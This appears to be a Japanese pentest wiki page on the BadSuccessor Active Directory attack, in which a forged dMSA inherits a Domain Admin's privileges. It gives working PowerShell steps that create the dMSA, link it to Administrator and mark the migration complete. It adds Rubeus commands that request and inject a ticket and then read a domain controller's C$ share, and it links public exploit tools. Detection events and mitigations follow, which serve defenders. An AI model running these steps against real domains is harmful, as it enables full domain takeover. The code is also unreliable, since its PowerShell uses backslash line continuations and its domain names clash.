# BadSuccessor: Delegated MSA Migration Abuse による Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 概要

Delegated Managed Service Accounts (**dMSA**) は、Windows Server 2025 で導入された **gMSA** の次世代 successor です。正規の migration workflow では、管理者が *old* account（user、computer、または service account）を dMSA に置き換え、permissions を透過的に維持できます。この workflow は、`Start-ADServiceAccountMigration` や `Complete-ADServiceAccountMigration` などの PowerShell cmdlets を通じて公開され、**dMSA object** の 2 つの LDAP attributes に依存します。

* **`msDS-ManagedAccountPrecededByLink`** – 置き換えられた（old）account への *DN link*。
* **`msDS-DelegatedMSAState`**       – migration state（`0` = none、`1` = in-progress、`2` = *completed*）。<sup>[[1]](#references)</sup>

攻撃者が OU 内に任意の dMSA を作成し、その 2 つの attributes を直接操作できる場合、LSASS と KDC はその dMSA をリンクされた account の *successor* として扱います。その後、攻撃者が dMSA として authenticate すると、**Domain Admin** まで、リンクされた account のすべての privileges を継承します。Administrator account がリンクされている場合も同様です。<sup>[[1]](#references)</sup>

この technique は、2025 年に Unit 42 によって **BadSuccessor** と命名されました。執筆時点では **security patch は提供されておらず**、OU permissions の hardening のみがこの issue を mitigate できます。<sup>[[1]](#references)[[2]](#references)</sup>

### Attack prerequisites

1. **an Organizational Unit (OU)** 内に objects を作成することを *allowed* されている account、および次のうち少なくとも 1 つ：
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`**（generic create）
2. LDAP および Kerberos への network connectivity（standard domain joined scenario / remote attack）。<sup>[[1]](#references)</sup>

## Vulnerable OUs の Enumerating

Unit 42 は各 OU の security descriptors を parse し、必要な ACEs を表示する PowerShell helper script をリリースしました。<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
内部では、スクリプトが `(objectClass=organizationalUnit)` に対するページング LDAP 検索を実行し、各 `nTSecurityDescriptor` について以下を確認します。

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8`（object class *msDS-DelegatedManagedServiceAccount*）

## Exploitation Steps

書き込み可能な OU が特定されると、攻撃は LDAP の書き込み 3 回だけで実行できます。<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
レプリケーション後、攻撃者は単純に `attacker_dMSA$` として**ログオン**するか、Kerberos TGT を要求できます。Windows は *superseded* アカウントのトークンを構築します。<sup>[[1]](#references)</sup>

### Automation

複数の公開 PoC は、パスワードの取得やチケット管理を含むワークフロー全体をラップします。

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

OU で **Object Auditing** を有効化し、以下の Windows Security Events を監視します:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** オブジェクトの作成
* **5136** – **`msDS-ManagedAccountPrecededByLink`** の変更
* **4662** – 特定の属性変更
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA に対する TGT 発行

`4662`（属性変更）、`4741`（computer/service account の作成）、`4624`（その後のログオン）を相関させることで、BadSuccessor の活動を迅速に特定できます。**XSIAM** などの XDR solutions には、すぐに使用できる queries が用意されています（references を参照）。<sup>[[2]](#references)</sup>

## Mitigation

* **least privilege** の原則を適用し、信頼できる roles にのみ *Service Account* management を委任する。
* 明示的に必要としない OU から `Create Child` / `msDS-DelegatedManagedServiceAccount` を削除する。
* 上記の event IDs を監視し、*non-Tier-0* identities による dMSA の作成または編集を alert する。

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Active Directory で dMSA を悪用して権限を昇格 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Good Accounts Go Bad: Delegated Managed Service Accounts の Exploiting](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
